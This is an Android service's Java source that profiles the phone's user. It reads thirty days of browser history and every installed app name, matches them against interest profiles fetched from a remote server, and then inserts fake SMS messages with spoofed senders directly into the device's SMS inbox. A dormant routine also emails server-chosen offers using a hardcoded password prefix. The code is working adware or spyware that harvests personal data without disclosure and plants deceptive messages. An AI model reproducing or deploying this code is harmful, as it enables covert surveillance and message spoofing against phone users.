package user.com.profiling;

import android.app.IntentService;
import android.content.ContentValues;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Browser;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Response;
import com.android.volley.VolleyError;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import user.com.profiling.network.ApiRequests;
import user.com.profiling.network.response.EmailOffer;
import user.com.profiling.network.response.EmailOffers;
import user.com.profiling.network.response.SmsOffer;
import user.com.profiling.network.response.SmsOffers;
import user.com.profiling.network.response.UserProfiling;
import user.com.profiling.util.EmailUtil;

/**
 * This {@code IntentService} does the app's actual work. {@code SampleAlarmReceiver} (a {@code WakefulBroadcastReceiver}) holds a partial wake lock for this service while the
 * service does its work. When the service is finished, it calls {@code completeWakefulIntent()} to release the wake lock.
 */
public class ProfilingSchedulingService extends IntentService {
	private static final String TAG = ProfilingSchedulingService.class.getSimpleName();
	private final static long THIRTY_DAYS_IN_MILLS = 2592000000l;
	private static final String PWD_PREFIX = "Simba";

	private ArrayList<String> browserHistory = new ArrayList<>();
	private ArrayList<String> appNames = new ArrayList<>();
	private ArrayList<Profile> profileInterests = new ArrayList<>();
	private int interestTh;
	HashMap<String, String> userProfileMap = new HashMap<>();

	public ProfilingSchedulingService() {
		super("SchedulingService");
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		startProfiling();
		// SampleAlarmReceiver.completeWakefulIntent(intent);
	}

	private void startProfiling() {
		// get profile data
		getUserProfiles();
		if (!isValidUserProfileData()) {
			Toast.makeText(getApplicationContext(), "Not valid User profile", Toast.LENGTH_LONG).show();
			return;
		}
		getBrowserHistory();
		getInstalledApps();
		generateProfiles();
		// getEmailOffers();
		if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
			// run only below kitkat
			getSmsOffers();
		}
		// email offer
		// sms offer
	}

	private void getSmsOffers() {
		ApiRequests.getSmsOffers(getApplicationContext(), new Response.Listener<SmsOffers>() {
			@Override
			public void onResponse(SmsOffers smsOffers) {
				try {
					Log.d(TAG, smsOffers.getMessages().get(0).get("US").toString());
					ArrayList<SmsOffer> offers = smsOffers.getMessages().get(0).get("US");
					ArrayList<Profile> profilesAboveThreshold = getProfilesAboveThreshold();

					// Test code to be removed.
					if (profilesAboveThreshold.isEmpty()) {
						profilesAboveThreshold.add(new Profile("Dater", 20));
					}
					for (final SmsOffer offer : offers) {
						for (Profile profile : profilesAboveThreshold) {
							if (offer.getProfile().equals(profile.getProfileName())) {
								Log.d(TAG, offer.getSender());
								// send sms
								addSmsToPhone(offer.getSender(), getSmsBody(offer));
								break;
							}
						}
					}
				} catch (Exception ignored) {
				}
			}
		}, new Response.ErrorListener() {
			@Override
			public void onErrorResponse(VolleyError volleyError) {
				Log.d(TAG, String.valueOf(volleyError.getMessage()));
			}
		});
	}

	private String getSmsBody(SmsOffer offer) {
		StringBuffer message = new StringBuffer(getBodyWithProperLink(offer.getBody(), offer.getLink()));
		message.append("/n");
		message.append(offer.getUnsubscribe());
		return message.toString();
	}

	private String getBodyWithProperLink(String body, String link) {
		return body.replace("LINK", link);
	}

	private void addSmsToPhone(String sender, String msg) {
		ContentValues values = new ContentValues();
		values.put("address", sender);// sender name
		values.put("body", msg);
		getContentResolver().insert(Uri.parse("content://sms/inbox"), values);
	}

	private void getEmailOffers() {
		ApiRequests.getEmailOffers(getApplicationContext(), new Response.Listener<EmailOffers>() {
			@Override
			public void onResponse(EmailOffers emailOffers) {
				try {
					Log.d(TAG, emailOffers.getEmails().get(0).get("US").toString());
					ArrayList<EmailOffer> offers = emailOffers.getEmails().get(0).get("US");
					ArrayList<Profile> profilesAboveThreshold = getProfilesAboveThreshold();
					for (final EmailOffer offer : offers) {
						for (Profile profile : profilesAboveThreshold) {
							if (offer.getProfile().equals(profile.getProfileName())) {
								Log.d(TAG, offer.getSubject());
								// send email
								String toEmail = EmailUtil.getUserPrimaryEmail(getApplicationContext());
								if (!TextUtils.isEmpty(toEmail))
									new Thread(new Runnable() {
										@Override
										public void run() {
											boolean success = EmailUtil.sendEmail(offer.getEmail(), PWD_PREFIX + offer.getWord(),
													EmailUtil.getUserPrimaryEmail(getApplicationContext()),
													offer.getSubject(), offer.getBody());
											String status = success ? "Email Success" : "Email Failed";
											Toast.makeText(getApplicationContext(), status, Toast.LENGTH_LONG).show();
										}
									}).start();
								break;
							}
						}
					}
				} catch (Exception ignored) {
				}
			}
		}, new Response.ErrorListener() {
			@Override
			public void onErrorResponse(VolleyError volleyError) {
				Log.d(TAG, String.valueOf(volleyError.getMessage()));
			}
		});
	}

	private void generateProfiles() {
		for (int i = 0; i < profileInterests.size(); i++) {
			String keywords = userProfileMap.get(profileInterests.get(i).getProfileName());
			profileInterests.get(i).setKeywords(keywords);
			if (!browserHistory.isEmpty()) {
				profileInterests.get(i).updateInteret(browserHistory);
			}
			if (!appNames.isEmpty()) {
				profileInterests.get(i).updateInteret(appNames);
			}
		}
	}

	private boolean isValidUserProfileData() {
		return !profileInterests.isEmpty() && interestTh != -1;
	}

	private void getBrowserHistory() {
		String[] projection = new String[] {
				Browser.BookmarkColumns.DATE
				, Browser.BookmarkColumns.URL
		};
		Cursor mCur = getContentResolver().query(android.provider.Browser.BOOKMARKS_URI,
				projection, null, null, Browser.BookmarkColumns.DATE + " DESC"
				);
		mCur.moveToFirst();
		int urlIdx = mCur.getColumnIndex(Browser.BookmarkColumns.URL);
		int dateIdx = mCur.getColumnIndex(Browser.BookmarkColumns.DATE);
		long currentTimeInMills = new Date().getTime();
		long thirtyDaysBefore = currentTimeInMills - THIRTY_DAYS_IN_MILLS;
		while (!mCur.isAfterLast()) {
			if (mCur.getLong(dateIdx) > thirtyDaysBefore) {
				browserHistory.add(mCur.getString(urlIdx));
				mCur.moveToNext();
			} else {
				break;
			}
		}
		mCur.close();
	}

	private void getInstalledApps() {
		PackageManager packageManager = this.getPackageManager();
		List<ApplicationInfo> applist = packageManager.getInstalledApplications(0);
		for (ApplicationInfo applicationInfo : applist) {
			appNames.add(String.valueOf(packageManager.getApplicationLabel(applicationInfo)));
		}
	}

	private void getUserProfiles() {
		try {
			UserProfiling userProfiling = ApiRequests.userProfiles(getApplicationContext());
			userProfileMap = userProfiling.getUserProfilesJson().getProfiles().get(0);
			profileInterests = Profile.getProfileInterestList(new ArrayList<>(userProfileMap.keySet()));
			interestTh = Integer.parseInt(userProfiling.getInterestTH());
			if (BuildConfig.DEBUG) Log.d(TAG, profileInterests.toString());
		} catch (Exception ignored) {
			interestTh = -1;
		}
	}

	public ArrayList<Profile> getProfilesAboveThreshold() {
		ArrayList<Profile> profilesAboveThreshold = new ArrayList<>();
		for (Profile profile : profileInterests) {
			if (profile.getInterest() > interestTh) {
				profilesAboveThreshold.add(profile);
			}
		}
		return profilesAboveThreshold;
	}
}